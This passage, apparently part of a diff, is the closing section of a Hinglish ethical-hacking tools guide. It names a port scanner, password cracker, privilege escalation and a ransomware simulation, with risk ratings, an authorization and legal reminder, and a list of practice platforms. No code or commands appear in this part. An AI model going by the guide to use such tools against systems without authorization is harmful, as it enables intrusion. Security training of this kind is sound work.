+```
+
+**Ethical Tip:** ⚠️ Ransomware simulation SIRF TEST ENVIRONMENT mein. Real systems par NEVER run karo.
+
+---
+
+# Summary & Best Practices
+
+## Tools Overview:
+
+| Tool | Difficulty | Use Case | Risk Level |
+|------|-----------|----------|------------|
+| Port Scanner | ⭐⭐ | Reconnaissance | Medium |
+| Password Cracker | ⭐⭐ | Weak password testing | High |
+| Privilege Escalation | ⭐⭐⭐ | Post-exploitation | Very High |
+| Encryption Tools | ⭐⭐ | Data protection | Low |
+
+## Best Practices:
+
+1. **Always get written authorization**
+2. **Test in isolated environments**
+3. **Document everything**
+4. **Follow responsible disclosure**
+5. **Keep learning and updating**
+
+## Legal Reminder:
+
+⚠️ **YAAD RAKHO:**
+- Bina permission = ILLEGAL
+- IT Act 2000 violations = Jail + Fine
+- Career destruction
+- Civil lawsuits
+
+**Practice on:**
+- HackTheBox
+- TryHackMe
+- Bug Bounty Programs
+- Own lab setups
+
+---
+
+**[END OF ADDITIONAL TOOLS GUIDE]**
+
+**Stay ethical, stay legal! 🔐**
